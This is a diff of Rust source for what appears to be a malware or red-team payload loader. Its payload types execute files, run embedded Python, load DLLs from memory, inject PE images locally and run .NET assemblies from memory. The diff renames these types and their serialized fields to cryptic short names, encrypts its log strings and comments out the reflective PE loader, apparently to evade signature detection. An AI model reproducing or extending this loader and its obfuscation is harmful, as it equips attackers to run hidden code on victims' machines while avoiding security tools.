@@ -50,16 +50,18 @@ pub enum PayloadExecThread {
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
+#[serde(rename = "yl")]
 pub enum Payload {
     Banner(),
     Print(Print),
     StopLoader(),
     WriteFile(WriteFile),
     WriteZip(WriteZip),
-    Exec(Exec),
-    ExecPython(ExecPython),
-    DllFromMemory(DllFromMemory),
-    ReflectivePEFromMemory(ReflectivePEFromMemory),
+    Ec(Ec),
+    EPY(EPY),
+    #[serde(rename = "dme")]
+    DFM(DFM),
+    //ReflectivePEFromMemory(ReflectivePEFromMemory),
     LocalPeInjection(LocalPeInjection),
     DotnetFromMemory(DotnetFromMemory),
 }
@@ -71,10 +73,10 @@ impl Payload {
             Payload::StopLoader() => stoploader(),
             Payload::WriteFile(payload) => payload.write_file(config),
             Payload::WriteZip(payload) => payload.write_zip(config),
-            Payload::Exec(payload) => payload.exec_file(),
-            Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
-            Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
-            Payload::ReflectivePEFromMemory(payload) => payload.reflective_pe_from_memory(config),
+            Payload::Ec(payload) => payload.exec_file(),
+            Payload::EPY(payload) => payload.exec_python_with_embedder(),
+            Payload::DFM(payload) => payload.dll_from_memory(config),
+            //Payload::ReflectivePEFromMemory(payload) => payload.reflective_pe_from_memory(config),
             Payload::LocalPeInjection(payload) => payload.exec_local_pe_injection(config),
             Payload::DotnetFromMemory(payload) => payload.exec_dotnet_from_memory(config),
         };
@@ -155,10 +157,10 @@ impl Payload {
             Payload::StopLoader() => false,
             Payload::WriteFile(payload) => payload.runonce,
             Payload::WriteZip(payload) => payload.runonce,
-            Payload::Exec(payload) => payload.runonce,
-            Payload::ExecPython(payload) => payload.runonce,
-            Payload::DllFromMemory(payload) => payload.runonce,
-            Payload::ReflectivePEFromMemory(payload) => payload.runonce,
+            Payload::Ec(payload) => payload.runonce,
+            Payload::EPY(payload) => payload.runonce,
+            Payload::DFM(payload) => payload.runonce,
+            //Payload::ReflectivePEFromMemory(payload) => payload.runonce,
             Payload::LocalPeInjection(payload) => payload.runonce,
             Payload::DotnetFromMemory(payload) => payload.runonce,
         }
@@ -166,18 +168,24 @@ impl Payload {
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
-pub struct DllFromMemory {
+#[serde(rename = "dme")]
+pub struct DFM {
+    #[serde(rename = "lk")]
     pub link: Link,
+    #[serde(rename = "ep")]
     pub dll_entrypoint: String,
+    #[serde(rename = "cc")]
     pub commandline: String,
+    #[serde(rename = "th")]
     pub thread: bool,
+    #[serde(rename = "ro")]
     pub runonce: bool,
 }
 
-impl DllFromMemory {
+impl DFM {
     #[cfg(target_os = "linux")]
     pub fn dll_from_memory(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
-        fail_linux_message(format!("{}", encrypt_string!("DllFromMemory")));
+        fail_linux_message(format!("{}", encrypt_string!("DFM")));
         Ok(PayloadExecThread::NoThread())
     }
 
@@ -193,7 +201,7 @@ impl DllFromMemory {
             });
             return Ok(PayloadExecThread::Thread(
                 dllthread,
-                Payload::DllFromMemory(self.clone()),
+                Payload::DFM(self.clone()),
             ));
         } else {
             dll_from_memory_exec(data, self.dll_entrypoint.clone(), self.commandline.clone());
@@ -236,20 +244,20 @@ pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandli
     let _result = dll_entry_point(c_commandline.as_ptr());
     info!("{}", encrypt_string!("Drop DLL memory (MemoryFreeLibrary)"));
     drop(mm);
-    info!("{}", encrypt_string!("DllFromMemory: end"));
+    info!("{}", encrypt_string!("DFM: end"));
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
-pub struct ExecPython {
+pub struct EPY {
     pub path: String, //path of python directory
     pub python_code: String,
     pub thread: bool,
     pub runonce: bool,
 }
-impl ExecPython {
+impl EPY {
     #[cfg(target_os = "linux")]
     pub fn exec_python_with_embedder(&self) -> Result<PayloadExecThread, anyhow::Error> {
-        fail_linux_message(format!("{}", encrypt_string!("ExecPython")));
+        fail_linux_message(format!("{}", encrypt_string!("EPY")));
         return Ok(PayloadExecThread::NoThread());
     }
 
@@ -272,7 +280,7 @@ impl ExecPython {
             });
             return Ok(PayloadExecThread::Thread(
                 tj,
-                Payload::ExecPython(self.clone()),
+                Payload::EPY(self.clone()),
             ));
         } else {
             python_embedder::embedder(&path, &self.python_code);
@@ -404,7 +412,7 @@ impl WriteFile {
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
-pub struct Exec {
+pub struct Ec {
     pub path: String,
     //pub commandline: CommandLine,
     pub cmdline: String,
@@ -413,7 +421,7 @@ pub struct Exec {
     pub visible: bool,
 }
 
-impl Exec {
+impl Ec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
     pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
@@ -452,7 +460,7 @@ note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
                     let _output = comm.output().expect("Failed to execute process");
                 };
             });
-            return Ok(PayloadExecThread::Thread(tj, Payload::Exec(self.clone())));
+            return Ok(PayloadExecThread::Thread(tj, Payload::Ec(self.clone())));
         } else {
             if self.visible {
                 let _output = comm.spawn()?;
@@ -504,6 +512,7 @@ impl Exec {
 }
 */
 
+/* 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct ReflectivePEFromMemory {
     pub link: Link,
@@ -548,6 +557,8 @@ impl ReflectivePEFromMemory {
         }
     }
 }
+
+*/
 
 #[cfg(target_os = "windows")]
 use crate::local_pe_injection::main::local_pe_injection;
